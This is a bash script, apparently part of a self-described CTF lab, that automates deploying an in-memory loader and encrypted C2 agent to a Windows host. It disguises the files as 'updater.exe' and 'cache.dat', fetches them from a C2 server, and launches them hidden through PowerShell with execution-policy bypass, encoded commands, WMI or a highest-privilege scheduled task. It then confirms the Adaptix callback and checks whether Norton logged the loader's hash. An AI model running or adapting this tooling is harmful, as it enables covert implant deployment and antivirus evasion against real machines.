#!/usr/bin/env bash
set -euo pipefail

# 文件作用：一键复现“PowerShell 启动 MemoryModulePP_Lite loader -> direct_https DLL 内存上线”测试。
# 用法：
#   ${REPO_ROOT}/scripts/run-mmpp-powershell-loader-test.sh [tag]
# 说明：
# - 这个脚本只负责本地 CTF 学习链路：构建 loader、发布文件、通过 Windows SSH 执行 PowerShell、轮询 Adaptix callback/hello。
# - 如果 Windows 测试机不可达，脚本会把结果记录为 ENVIRONMENT_BLOCKED，不会伪造上线结论。

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT=${ROOT:-$(cd -- "$SCRIPT_DIR/.." && pwd)}
LAB="$ROOT/research/memory-loader-lab"
REPORT=${REPORT:-$ROOT/out/reports/powershell-memory-loader}
PUB=${PUB:-$ROOT/out/publish}
SSH_HELPER=${SSH_HELPER:-${SSH_HELPER_PATH:-}}
API_BASE=${API_BASE:-https://127.0.0.1:4321/endpoint}
API_USER=${API_USER:-ctf}
API_ENV=${API_ENV:-$ROOT/.adaptix_api.env}
if [[ -f "$API_ENV" ]]; then
  set -a
  # shellcheck disable=SC1090
  source "$API_ENV"
  set +a
fi
API_PASS=${API_PASS:-${ADAPTIX_PASSWORD:-}}
WIN_IP=${WIN_IP:-WIN_TEST_HOST_PLACEHOLDER}
LHOST=${LHOST:-C2_HOST_PLACEHOLDER}
TAG=${1:-mmp}
TS=$(date +%Y%m%d_%H%M%S)
PREFIX="psml_${TAG}_${TS}"
LAUNCH_METHOD=${LAUNCH_METHOD:-start_process}
LAUNCH_OBSERVE_SECONDS=${LAUNCH_OBSERVE_SECONDS:-8}
NEW_AGENT_POLL_INTERVAL=${NEW_AGENT_POLL_INTERVAL:-2}
HELLO_POLL_INTERVAL=${HELLO_POLL_INTERVAL:-2}
NEW_AGENT_TIMEOUT_SECONDS=${NEW_AGENT_TIMEOUT_SECONDS:-90}
HELLO_TIMEOUT_SECONDS=${HELLO_TIMEOUT_SECONDS:-120}
LOADER_KEY=${LOADER_KEY:-CHANGE_ME_MEMORY_LOADER_KEY}
KEY_SOURCE=${KEY_SOURCE:-argv}
TRANSFER_METHOD=${TRANSFER_METHOD:-http}
DELETE_KEY_FILE_AFTER_START=${DELETE_KEY_FILE_AFTER_START:-0}
NESTED_POWERSHELL_WINDOWSTYLE=${NESTED_POWERSHELL_WINDOWSTYLE:-Hidden}
export NEW_AGENT_POLL_INTERVAL HELLO_POLL_INTERVAL NEW_AGENT_TIMEOUT_SECONDS HELLO_TIMEOUT_SECONDS
mkdir -p "$REPORT"/{artifacts,evidence,matrix} "$PUB"
if [[ -z "$SSH_HELPER" ]]; then
  echo "[-] missing SSH_HELPER. Export SSH_HELPER=/path/to/helper" >&2
  exit 1
fi

LOADER_BUILD="$LAB/build/x64/loader_agentdll_mmpp_lite.x64.exe"
LOADER_ART="${LOADER_ART:-$REPORT/artifacts/loader_agentdll_mmpp_lite.x64.exe}"
PAYLOAD_ART="${PAYLOAD_ART:-$REPORT/artifacts/direct_https_profile.x64.bin}"
MATRIX="$REPORT/matrix/powershell-memory-loader-results.tsv"

log(){ printf '[*] %s\n' "$*"; }
fail_matrix(){
  local conclusion="$1" start_result="$2" evidence="$3"
  if [[ ! -f "$MATRIX" ]]; then
    printf 'time\tvariant\tloader\tlaunch_method\tloader_sha256\tpayload_sha256\twindows_ip\tdownload\tstart_result\tnew_agent\thello_completed\tprocess_after_wait\tnorton_hash_match\tconclusion\tevidence\n' > "$MATRIX"
  fi
  local lsha="not_built" bsha="not_found"
  [[ -f "$LOADER_ART" ]] && lsha=$(sha256sum "$LOADER_ART" | awk '{print $1}')
  [[ -f "$PAYLOAD_ART" ]] && bsha=$(sha256sum "$PAYLOAD_ART" | awk '{print $1}')
  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$(date '+%F %T %z')" "${TAG}" "loader_agentdll_mmpp_lite.x64.exe" "PowerShell ${LAUNCH_METHOD}" \
    "$lsha" "$bsha" "$WIN_IP" "unknown" "$start_result" "not_tested" "not_tested" "not_tested" "not_tested" "$conclusion" "$evidence" >> "$MATRIX"
}

ps_quote(){
  local v=${1//\'/\'\'}
  printf "'%s'" "$v"
}

ssh_b64_upload(){
  local src="$1" remote="$2" label="$3"
  local logf="$REPORT/evidence/ssh-b64-upload-${PREFIX}-${label}.txt"
  local remote_b64="${remote}.b64"
  local remote_dir
  remote_dir=$(python3 - "$remote" <<'PY'
import sys
p=sys.argv[1].replace('\\\\','\\')
print(p.rsplit('\\',1)[0] if '\\' in p else '.')
PY
)
  local src_sha src_size chunk_size b64_len total_chunks i chunk
  src_sha=$(sha256sum "$src" | awk '{print $1}')
  src_size=$(stat -c %s "$src")
  chunk_size=${SSH_B64_CHUNK_SIZE:-3000}
  b64_len=$(base64 -w0 "$src" | wc -c | tr -d ' ')
  total_chunks=$(( (b64_len + chunk_size - 1) / chunk_size ))
  {
    printf 'SSH_B64_UPLOAD label=%s\nSRC=%s\nREMOTE=%s\nSRC_SHA256=%s\nSRC_SIZE=%s\nCHUNK_SIZE=%s\nTOTAL_CHUNKS=%s\n' \
      "$label" "$src" "$remote" "$src_sha" "$src_size" "$chunk_size" "$total_chunks"
  } | tee "$logf"
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -Command \"New-Item -ItemType Directory -Force -Path $(ps_quote "$remote_dir") | Out-Null; Remove-Item -Force -LiteralPath $(ps_quote "$remote_b64") -ErrorAction SilentlyContinue; Remove-Item -Force -LiteralPath $(ps_quote "$remote") -ErrorAction SilentlyContinue; exit 0\"" >> "$logf" 2>&1
  i=0
  while IFS= read -r chunk || [[ -n "$chunk" ]]; do
    i=$((i+1))
    printf 'chunk %s/%s bytes=%s\n' "$i" "$total_chunks" "${#chunk}" >> "$logf"
    "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-Content -LiteralPath $(ps_quote "$remote_b64") -Value $(ps_quote "$chunk") -NoNewline -Encoding ASCII\"" >> "$logf" 2>&1
  done < <(base64 -w0 "$src" | fold -w "$chunk_size")
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -Command \"\$b=[IO.File]::ReadAllText($(ps_quote "$remote_b64")); [IO.File]::WriteAllBytes($(ps_quote "$remote"), [Convert]::FromBase64String(\$b)); Remove-Item -Force -LiteralPath $(ps_quote "$remote_b64") -ErrorAction SilentlyContinue; \$h=(Get-FileHash -LiteralPath $(ps_quote "$remote") -Algorithm SHA256).Hash.ToLower(); 'REMOTE_SHA256=' + \$h; if (\$h -ne '$src_sha') { throw 'sha256_mismatch' }\"" >> "$logf" 2>&1
  tail -5 "$logf"
}

if [[ -z "$API_PASS" ]]; then
  echo "[-] missing API password. Set API_PASS/ADAPTIX_PASSWORD or create $API_ENV" >&2
  fail_matrix "ENVIRONMENT_BLOCKED" "api_password_missing" "$API_ENV"
  exit 1
fi

if [[ "${SKIP_LOADER_BUILD:-0}" == "1" ]]; then
  log "skipping MemoryModulePP_Lite loader build; using existing LOADER_ART=$LOADER_ART"
  printf 'SKIP_LOADER_BUILD=1\nLOADER_ART=%s\n' "$LOADER_ART" | tee "$REPORT/evidence/build-mmpp-lite-loader-${PREFIX}.log"
  if [[ ! -f "$LOADER_ART" ]]; then
    echo "[-] missing prebuilt loader: $LOADER_ART" >&2
    fail_matrix "ENVIRONMENT_BLOCKED" "prebuilt_loader_missing" "$LOADER_ART"
    exit 2
  fi
else
  log "building MemoryModulePP_Lite loader"
  make -C "$LAB" mmp-loader 2>&1 | tee "$REPORT/evidence/build-mmpp-lite-loader-${PREFIX}.log"
  cp "$LOADER_BUILD" "$LOADER_ART"
fi
if [[ ! -f "$PAYLOAD_ART" ]]; then
  echo "[-] missing payload bin: $PAYLOAD_ART" >&2
  fail_matrix "ENVIRONMENT_BLOCKED" "payload_missing" "$PAYLOAD_ART"
  exit 2
fi
sha256sum "$LOADER_ART" "$PAYLOAD_ART" | tee "$REPORT/artifacts/mmpp-lite-run-${PREFIX}-sha256.txt"

log "preflight Windows SSH"
if ! ping -c1 -W1 "$WIN_IP" >/dev/null 2>&1; then
  echo "[-] Windows ping failed: $WIN_IP" | tee "$REPORT/evidence/windows-preflight-${PREFIX}.txt"
  fail_matrix "ENVIRONMENT_BLOCKED" "windows_ping_failed" "$REPORT/evidence/windows-preflight-${PREFIX}.txt"
  exit 3
fi
if ! "$SSH_HELPER" 'cmd /c echo WIN_OK && hostname && whoami' | tee "$REPORT/evidence/windows-preflight-${PREFIX}.txt"; then
  fail_matrix "ENVIRONMENT_BLOCKED" "windows_ssh_failed" "$REPORT/evidence/windows-preflight-${PREFIX}.txt"
  exit 4
fi

log "publishing artifacts"
cp "$LOADER_ART" "$PUB/${PREFIX}_updater.exe"
cp "$PAYLOAD_ART" "$PUB/${PREFIX}_cache.dat"
sha256sum "$PUB/${PREFIX}_updater.exe" "$PUB/${PREFIX}_cache.dat" | tee "$REPORT/artifacts/published-${PREFIX}-sha256.txt"

WIN_DIR="C:\\Users\\Public\\powershell_memory_loader\\$PREFIX"
WIN_LOADER="$WIN_DIR\\updater.exe"
WIN_BIN="$WIN_DIR\\cache.dat"
if [[ "$TRANSFER_METHOD" == "ssh_b64" ]]; then
  log "TRANSFER_METHOD=ssh_b64: uploading loader/cache over SSH base64 before launch"
  ssh_b64_upload "$LOADER_ART" "$WIN_LOADER" "loader"
  ssh_b64_upload "$PAYLOAD_ART" "$WIN_BIN" "cache"
elif [[ "$TRANSFER_METHOD" != "http" ]]; then
  echo "[-] unsupported TRANSFER_METHOD=$TRANSFER_METHOD (expected http or ssh_b64)" >&2
  fail_matrix "ENVIRONMENT_BLOCKED" "bad_transfer_method" "$TRANSFER_METHOD"
  exit 2
fi

log "capturing C2 agents before launch"
python3 - "$API_BASE" "$API_USER" "$API_PASS" "$REPORT/evidence/agents-before-${PREFIX}.json" <<'PY'
import json, ssl, sys, time, urllib.request
base,user,pw,out=sys.argv[1:5]
ctx=ssl._create_unverified_context()
def req(path,method='GET',data=None,tok=None):
    h={}; b=None
    if tok: h['Authorization']='Bearer '+tok
    if data is not None:
        h['Content-Type']='application/json'; b=json.dumps(data).encode()
    r=urllib.request.Request(base.rstrip('/')+path,data=b,headers=h,method=method)
    with urllib.request.urlopen(r,context=ctx,timeout=25) as resp:
        return json.loads(resp.read().decode() or 'null')
tok=req('/login','POST',{'username':user,'password':pw,'version':'mmpp-runner'})['access_token']
ag=[a for a in req('/agent/list',tok=tok) if a.get('a_name')=='direct_https']
ag.sort(key=lambda a:int(a.get('a_last_tick') or 0), reverse=True)
open(out,'w',encoding='utf-8').write(json.dumps({'now':int(time.time()),'agents':ag},ensure_ascii=False,indent=2)+'\n')
print(json.dumps({'now':int(time.time()),'count':len(ag),'top':ag[:3]},ensure_ascii=False,indent=2))
PY

cat > "$REPORT/evidence/launch-${PREFIX}.ps1" <<PS
\$ErrorActionPreference='Continue'
\$ProgressPreference='SilentlyContinue'
\$Prefix='$PREFIX'
\$Dir="C:\\Users\\Public\\powershell_memory_loader\\\$Prefix"
\$Base='http://$LHOST:8000'
\$Loader=Join-Path \$Dir 'updater.exe'
\$Bin=Join-Path \$Dir 'cache.dat'
\$Log=Join-Path \$Dir 'mmpp-loader-status.txt'
\$KeySource='$KEY_SOURCE'
\$LoaderKey='$LOADER_KEY'
\$DeleteKeyFileAfterStart='$DELETE_KEY_FILE_AFTER_START'
\$NestedPowerShellWindowStyle='$NESTED_POWERSHELL_WINDOWSTYLE'
New-Item -ItemType Directory -Force \$Dir | Out-Null
\$TransferMethod='$TRANSFER_METHOD'
if (\$TransferMethod -eq 'http') {
  Invoke-WebRequest -UseBasicParsing "\$Base/${PREFIX}_updater.exe" -OutFile \$Loader
  Invoke-WebRequest -UseBasicParsing "\$Base/${PREFIX}_cache.dat" -OutFile \$Bin
} elseif (\$TransferMethod -eq 'ssh_b64') {
  "TRANSFER_PRESTAGED_BY_SSH_B64=True"
} else {
  "TRANSFER_UNSUPPORTED=\$TransferMethod"
  exit 9
}
if (-not (Test-Path \$Loader)) { "TRANSFER_ERROR=loader_missing"; exit 9 }
if (-not (Test-Path \$Bin)) { "TRANSFER_ERROR=cache_missing"; exit 9 }
\$lh=(Get-FileHash \$Loader -Algorithm SHA256).Hash.ToLower()
\$bh=(Get-FileHash \$Bin -Algorithm SHA256).Hash.ToLower()
"PREFIX=\$Prefix"
"DIR=\$Dir"
"TRANSFER_METHOD=\$TransferMethod"
"LOADER_SHA256=\$lh"
"BIN_SHA256=\$bh"
"LOADER_EXISTS_BEFORE=\$(Test-Path \$Loader)"
"BIN_EXISTS_BEFORE=\$(Test-Path \$Bin)"
\$KeyArg = \$LoaderKey
\$KeyFile = \$null
if (\$KeySource -eq 'env') {
  [Environment]::SetEnvironmentVariable('DHPL_KEY', \$LoaderKey, 'Process')
  [Environment]::SetEnvironmentVariable('DHPL_KEY', \$LoaderKey, 'User')
  \$KeyArg = 'env:DHPL_KEY'
} elseif (\$KeySource -eq 'file') {
  \$KeyFile = Join-Path \$Dir 'dhpl-loader.key'
  [System.IO.File]::WriteAllText(\$KeyFile, \$LoaderKey, (New-Object System.Text.UTF8Encoding(\$false)))
  try { (Get-Item \$KeyFile -Force).Attributes = 'Hidden' } catch {}
  \$KeyArg = 'file:' + \$KeyFile
} elseif (\$KeySource -eq 'default') {
  \$KeyArg = 'env:DHPL_KEY'
  [Environment]::SetEnvironmentVariable('DHPL_KEY', \$LoaderKey, 'Process')
  [Environment]::SetEnvironmentVariable('DHPL_KEY', \$LoaderKey, 'User')
} else {
  \$KeyArg = \$LoaderKey
}
"KEY_SOURCE=\$KeySource"
"KEY_ARG_MODE=\$([string]\$KeyArg -replace [regex]::Escape(\$LoaderKey),'<literal-redacted>')"
\$argList = '"' + \$Bin + '" "' + \$KeyArg + '" "' + \$Log + '"'
"START_METHOD=$LAUNCH_METHOD"
\$pidToWatch = \$null
if ('$LAUNCH_METHOD' -eq 'wmi') {
  \$cmdLine = '"' + \$Loader + '" ' + \$argList
  \$r = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine=\$cmdLine; CurrentDirectory=\$Dir }
  "START_RETURN=\$(\$r.ReturnValue)"
  "START_PID=\$(\$r.ProcessId)"
  \$pidToWatch = [int]\$r.ProcessId
} elseif ('$LAUNCH_METHOD' -eq 'scheduled_task') {
  \$taskName = "psml_\$Prefix"
  \$action = New-ScheduledTaskAction -Execute \$Loader -Argument \$argList -WorkingDirectory \$Dir
  \$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
  Register-ScheduledTask -TaskName \$taskName -Action \$action -Trigger \$trigger -RunLevel Highest -Force | Out-Null
  Start-ScheduledTask -TaskName \$taskName
  Start-Sleep -Milliseconds 800
  \$proc = Get-CimInstance Win32_Process | Where-Object { \$_.ExecutablePath -eq \$Loader } | Select-Object -First 1
  if (\$proc) { "START_RETURN=0"; "START_PID=\$(\$proc.ProcessId)"; \$pidToWatch = [int]\$proc.ProcessId } else { "START_RETURN=no_process"; "START_PID=0"; \$pidToWatch = 0 }
} elseif ('$LAUNCH_METHOD' -eq 'cmd_start') {
  \$cmdArgs = '/c start "" /D "' + \$Dir + '" "' + \$Loader + '" ' + \$argList
  \$p = Start-Process -FilePath \$env:ComSpec -ArgumentList \$cmdArgs -WindowStyle Hidden -PassThru
  Start-Sleep -Milliseconds 1000
  \$proc = Get-CimInstance Win32_Process | Where-Object { \$_.ExecutablePath -eq \$Loader } | Sort-Object CreationDate -Descending | Select-Object -First 1
  if (\$proc) { "START_RETURN=0"; "START_PID=\$(\$proc.ProcessId)"; \$pidToWatch = [int]\$proc.ProcessId } else { "START_RETURN=cmd_wrapper_\$(\$p.Id)_no_process"; "START_PID=0"; \$pidToWatch = 0 }
} elseif ('$LAUNCH_METHOD' -eq 'powershell_nested') {
  \$inner = '& "' + \$Loader + '" ' + \$argList
  \$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\$inner))
  \$psArgs = @('-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-EncodedCommand',\$encoded)
  if (\$NestedPowerShellWindowStyle -eq 'None') {
    \$p = Start-Process -FilePath 'powershell.exe' -ArgumentList \$psArgs -PassThru
  } else {
    \$p = Start-Process -FilePath 'powershell.exe' -ArgumentList \$psArgs -WindowStyle \$NestedPowerShellWindowStyle -PassThru
  }
  Start-Sleep -Milliseconds 1000
  \$proc = Get-CimInstance Win32_Process | Where-Object { \$_.ExecutablePath -eq \$Loader } | Sort-Object CreationDate -Descending | Select-Object -First 1
  if (\$proc) { "START_RETURN=0"; "START_PID=\$(\$proc.ProcessId)"; \$pidToWatch = [int]\$proc.ProcessId } else { "START_RETURN=powershell_wrapper_\$(\$p.Id)_no_process"; "START_PID=0"; \$pidToWatch = 0 }
} else {
  \$p=Start-Process -FilePath \$Loader -ArgumentList \$argList -WindowStyle Hidden -PassThru
  "START_PID=\$(\$p.Id)"
  \$pidToWatch = [int]\$p.Id
}
if (\$DeleteKeyFileAfterStart -eq '1' -and \$KeyFile) {
  \$deadline = (Get-Date).AddSeconds(12)
  while ((Get-Date) -lt \$deadline) {
    if (Test-Path \$Log) {
      \$logText = Get-Content -LiteralPath \$Log -ErrorAction SilentlyContinue | Out-String
      if (\$logText -match 'DHPLE2_KEY_DERIVE_OK|DHPLE1_DECRYPT_OK|DHPL_VALIDATE_OK|DHPL_RUN_AGENT_BEGIN') { break }
    }
    if (\$pidToWatch -and (Get-Process -Id \$pidToWatch -ErrorAction SilentlyContinue)) { Start-Sleep -Milliseconds 700 } else { Start-Sleep -Milliseconds 700 }
  }
  Remove-Item -Force -LiteralPath \$KeyFile -ErrorAction SilentlyContinue
  "KEY_FILE_DELETE_AFTER_START=True"
  "KEY_FILE_EXISTS_AFTER_DELETE=\$(Test-Path \$KeyFile)"
}
Start-Sleep -Seconds $LAUNCH_OBSERVE_SECONDS
\$procAfter = \$null
if (\$pidToWatch -and \$pidToWatch -gt 0) {
  \$procAfter = Get-Process -Id \$pidToWatch -ErrorAction SilentlyContinue
}
"ALIVE_AFTER_${LAUNCH_OBSERVE_SECONDS}S=\$([bool]\$procAfter)"
"LOADER_LOG_EXISTS=\$(Test-Path \$Log)"
if (Test-Path \$Log) { "LOADER_LOG_BEGIN"; Get-Content \$Log; "LOADER_LOG_END" }
"PROCESS_SNAPSHOT"
Get-CimInstance Win32_Process | Where-Object { \$_.ProcessId -eq \$pidToWatch -or \$_.ExecutablePath -eq \$Loader -or \$_.CommandLine -match [regex]::Escape(\$Prefix) } | Select-Object ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine | Format-List | Out-String -Width 300
PS
iconv -f UTF-8 -t UTF-16LE "$REPORT/evidence/launch-${PREFIX}.ps1" | base64 -w0 > "$REPORT/evidence/launch-${PREFIX}.b64"
cp "$REPORT/evidence/launch-${PREFIX}.ps1" "$PUB/${PREFIX}_launch.ps1"
B64=$(cat "$REPORT/evidence/launch-${PREFIX}.b64")
log "launching via PowerShell ${LAUNCH_METHOD}"
set +e
if [[ "${USE_ENCODED_COMMAND:-0}" == "1" ]]; then
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $B64" | tee "$REPORT/evidence/windows-launch-${PREFIX}.txt"
else
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -Command \"\$p=Join-Path \$env:TEMP '${PREFIX}_launch.ps1'; iwr -UseBasicParsing 'http://$LHOST:8000/${PREFIX}_launch.ps1' -OutFile \$p; powershell -NoProfile -ExecutionPolicy Bypass -File \$p\"" | tee "$REPORT/evidence/windows-launch-${PREFIX}.txt"
fi
LAUNCH_RC=${PIPESTATUS[0]}
set -e
echo "LAUNCH_RC=$LAUNCH_RC" | tee "$REPORT/evidence/launch-rc-${PREFIX}.txt"

log "polling new C2 agent and hello"
set +e
python3 - "$API_BASE" "$API_USER" "$API_PASS" "$REPORT/evidence/agents-before-${PREFIX}.json" "$REPORT/evidence/poll-new-agent-${PREFIX}.json" "$REPORT/evidence/hello-${PREFIX}.json" <<'PY'
import json, os, ssl, sys, time, urllib.parse, urllib.request
base,user,pw,before_path,poll_out,hello_out=sys.argv[1:7]
new_agent_interval=float(os.environ.get('NEW_AGENT_POLL_INTERVAL','2'))
hello_interval=float(os.environ.get('HELLO_POLL_INTERVAL','2'))
new_agent_timeout=float(os.environ.get('NEW_AGENT_TIMEOUT_SECONDS','90'))
hello_timeout=float(os.environ.get('HELLO_TIMEOUT_SECONDS','120'))
ctx=ssl._create_unverified_context()
def req(path,method='GET',data=None,tok=None):
    h={}; b=None
    if tok: h['Authorization']='Bearer '+tok
    if data is not None:
        h['Content-Type']='application/json'; b=json.dumps(data).encode()
    r=urllib.request.Request(base.rstrip('/')+path,data=b,headers=h,method=method)
    with urllib.request.urlopen(r,context=ctx,timeout=25) as resp:
        raw=resp.read().decode('utf-8','replace')
        return json.loads(raw) if raw else None
def agents(tok):
    ag=[a for a in req('/agent/list',tok=tok) if a.get('a_name')=='direct_https']
    ag.sort(key=lambda a:int(a.get('a_last_tick') or 0), reverse=True)
    return ag
def tasks(tok, aid):
    return req('/agent/task/list?'+urllib.parse.urlencode({'agent_id':aid,'limit':160}),tok=tok)
tok=req('/login','POST',{'username':user,'password':pw,'version':'mmpp-runner-poll'})['access_token']
before=json.load(open(before_path,encoding='utf-8'))
before_ids={a['a_id'] for a in before['agents']}
new=None
end=time.time()+new_agent_timeout
while time.time()<end:
    a=agents(tok)
    n=[x for x in a if x.get('a_id') not in before_ids]
    if n:
        new=n[0]; break
    time.sleep(new_agent_interval)
poll={'now':int(time.time()),'new_agent':new,'top':agents(tok)[:5]}
open(poll_out,'w',encoding='utf-8').write(json.dumps(poll,ensure_ascii=False,indent=2)+'\n')
print(json.dumps(poll,ensure_ascii=False,indent=2))
if not new:
    open(hello_out,'w',encoding='utf-8').write(json.dumps({'completed':False,'reason':'no_new_agent'},ensure_ascii=False,indent=2)+'\n')
    raise SystemExit(5)
aid=new['a_id']
start=int(time.time())
resp=req('/agent/command/raw','POST',{'id':aid,'cmdline':'hello'},tok=tok)
found=None
end=time.time()+hello_timeout
while time.time()<end:
    ts=tasks(tok, aid)
    if isinstance(ts,list):
        m=[t for t in ts if t.get('a_cmdline')=='hello' and t.get('a_completed') and int(t.get('a_start_time') or 0)>=start]
        if m:
            m.sort(key=lambda t:int(t.get('a_start_time') or 0), reverse=True)
            found=m[0]; break
    time.sleep(hello_interval)
after=[x for x in agents(tok) if x.get('a_id')==aid]
hello={'now':int(time.time()),'agent_id':aid,'submit_response':resp,'completed':bool(found),'task':found,'after':after[0] if after else None}
open(hello_out,'w',encoding='utf-8').write(json.dumps(hello,ensure_ascii=False,indent=2)+'\n')
print(json.dumps(hello,ensure_ascii=False,indent=2))
if not found: raise SystemExit(6)
PY
POLL_RC=$?
set -e
echo "POLL_RC=$POLL_RC" | tee "$REPORT/evidence/poll-rc-${PREFIX}.txt"

log "postcheck process/files/Norton hash"
cat > "$REPORT/evidence/post-${PREFIX}.ps1" <<PS
\$Prefix='$PREFIX'
\$Dir="C:\\Users\\Public\\powershell_memory_loader\\\$Prefix"
"POST_PREFIX=\$Prefix"
"DIR_EXISTS=\$(Test-Path \$Dir)"
if (Test-Path \$Dir) { Get-ChildItem -Force \$Dir | Select-Object Name,Length,LastWriteTime | Format-Table -AutoSize | Out-String -Width 200 }
"LOADER_LOG"
\$Log=Join-Path \$Dir 'mmpp-loader-status.txt'
if (Test-Path \$Log) { Get-Content \$Log | Out-String -Width 300 } else { "NO_LOADER_LOG" }
"PROCESS_MATCHES"
Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [regex]::Escape(\$Prefix) -or \$_.ExecutablePath -like "\$Dir*" } | Select-Object ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine | Format-List | Out-String -Width 300
"SCHEDULED_TASK_CLEANUP"
\$taskName = "psml_\$Prefix"
\$task = Get-ScheduledTask -TaskName \$taskName -ErrorAction SilentlyContinue
if (\$task) { "SCHEDULED_TASK_EXISTS=True"; Unregister-ScheduledTask -TaskName \$taskName -Confirm:\$false -ErrorAction SilentlyContinue; "SCHEDULED_TASK_CLEANED=True" } else { "SCHEDULED_TASK_EXISTS=False" }
"KEY_SOURCE=$KEY_SOURCE"
if ('$KEY_SOURCE' -eq 'env') { [Environment]::SetEnvironmentVariable('DHPL_KEY', \$null, 'User'); "DHPL_KEY_USER_CLEANED=True" }
"NORTON_HASH_MATCH"
\$loader=Join-Path \$Dir 'updater.exe'
if (Test-Path \$loader) {
  \$h=(Get-FileHash \$loader -Algorithm SHA256).Hash.ToLower()
  "LOADER_SHA256=\$h"
  \$hits = @(Get-ChildItem 'C:\\ProgramData\\Norton' -Recurse -Force -ErrorAction SilentlyContinue -Include '*log','*.xml','*.txt' | Select-String -Pattern \$h -ErrorAction SilentlyContinue | Select-Object -First 20 Path,LineNumber,Line)
  if (\$hits.Count -gt 0) { "NORTON_HASH_HIT=True"; \$hits | Format-List | Out-String -Width 300 } else { "NORTON_HASH_HIT=False" }
} else { "NORTON_HASH_HIT=loader_missing" }
PS
cp "$REPORT/evidence/post-${PREFIX}.ps1" "$PUB/${PREFIX}_post.ps1"
B64P=$(iconv -f UTF-8 -t UTF-16LE "$REPORT/evidence/post-${PREFIX}.ps1" | base64 -w0)
set +e
if [[ "${USE_ENCODED_COMMAND:-0}" == "1" ]]; then
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $B64P" | tee "$REPORT/evidence/windows-post-${PREFIX}.txt"
else
  "$SSH_HELPER" "powershell -NoProfile -ExecutionPolicy Bypass -Command \"\$p=Join-Path \$env:TEMP '${PREFIX}_post.ps1'; iwr -UseBasicParsing 'http://$LHOST:8000/${PREFIX}_post.ps1' -OutFile \$p; powershell -NoProfile -ExecutionPolicy Bypass -File \$p\"" | tee "$REPORT/evidence/windows-post-${PREFIX}.txt"
fi
POST_RC=${PIPESTATUS[0]}
set -e
echo "POST_RC=$POST_RC" | tee "$REPORT/evidence/post-rc-${PREFIX}.txt"
python3 - "$MATRIX" "$TAG" "$WIN_IP" "$LOADER_ART" "$PAYLOAD_ART" "$REPORT/evidence/windows-launch-${PREFIX}.txt" "$REPORT/evidence/poll-new-agent-${PREFIX}.json" "$REPORT/evidence/hello-${PREFIX}.json" "$REPORT/evidence/windows-post-${PREFIX}.txt" "$POLL_RC" <<'PY'
import hashlib, json, re, sys, time
from pathlib import Path
matrix, tag, win_ip, loader, payload, launch, poll, hello, post, poll_rc = sys.argv[1:11]
def sha(path):
    h=hashlib.sha256()
    with open(path,'rb') as f:
        for b in iter(lambda:f.read(1024*1024), b''):
            h.update(b)
    return h.hexdigest()
launch_text=Path(launch).read_text(encoding='utf-8',errors='ignore') if Path(launch).exists() else ''
post_text=Path(post).read_text(encoding='utf-8',errors='ignore') if Path(post).exists() else ''
poll_obj=json.loads(Path(poll).read_text(encoding='utf-8')) if Path(poll).exists() else {}
hello_obj=json.loads(Path(hello).read_text(encoding='utf-8')) if Path(hello).exists() else {}
exit_code_match=re.search(r'EXIT_CODE=([0-9-]+)', launch_text)
alive=bool(re.search(r'ALIVE_AFTER_\d+S=True', launch_text))
new_agent=bool(poll_obj.get('new_agent'))
hello_done=bool(hello_obj.get('completed'))
norton_hash='NORTON_HASH_HIT=True' in post_text
if hello_done:
    conclusion='PASS_CALLBACK_HELLO'
elif exit_code_match and exit_code_match.group(1) == '30':
    conclusion='MMPP_LOAD_FAILED_NO_CALLBACK'
elif new_agent and not hello_done:
    conclusion='CALLBACK_NO_HELLO'
else:
    conclusion='NO_CALLBACK'
alive_label_match=re.search(r'ALIVE_AFTER_(\d+S)=True', launch_text)
start_result=('alive_after_'+alive_label_match.group(1).lower()) if alive_label_match else ('exit_'+exit_code_match.group(1) if exit_code_match else 'unknown')
download='ok' if 'LOADER_EXISTS_BEFORE=True' in launch_text and 'BIN_EXISTS_BEFORE=True' in launch_text else ('blocked_or_failed' if 'TRANSFER_ERROR=' in launch_text or 'Invoke-WebRequest :' in launch_text else 'unknown')
process=start_result if alive else 'not_'+start_result
if not Path(matrix).exists():
    Path(matrix).write_text('time\tvariant\tloader\tlaunch_method\tloader_sha256\tpayload_sha256\twindows_ip\tdownload\tstart_result\tnew_agent\thello_completed\tprocess_after_wait\tnorton_hash_match\tconclusion\tevidence\n', encoding='utf-8')
line=[
    time.strftime('%Y-%m-%d %H:%M:%S %z'),
    tag,
    'loader_agentdll_mmpp_lite.x64.exe',
    'PowerShell '+re.search(r'START_METHOD=([A-Za-z0-9_\\-]+)', launch_text).group(1) if re.search(r'START_METHOD=([A-Za-z0-9_\\-]+)', launch_text) else 'PowerShell start_process',
    sha(loader),
    sha(payload),
    win_ip,
    download,
    start_result,
    str(new_agent).lower(),
    str(hello_done).lower(),
    process,
    str(norton_hash).lower(),
    conclusion,
    ';'.join([launch,poll,hello,post])
]
with open(matrix,'a',encoding='utf-8') as f:
    f.write('\t'.join(line)+'\n')
print(json.dumps({'conclusion':conclusion,'poll_rc':poll_rc,'start_result':start_result,'new_agent':new_agent,'hello_completed':hello_done},ensure_ascii=False,indent=2))
PY
log "done prefix=$PREFIX"
exit "$POLL_RC"
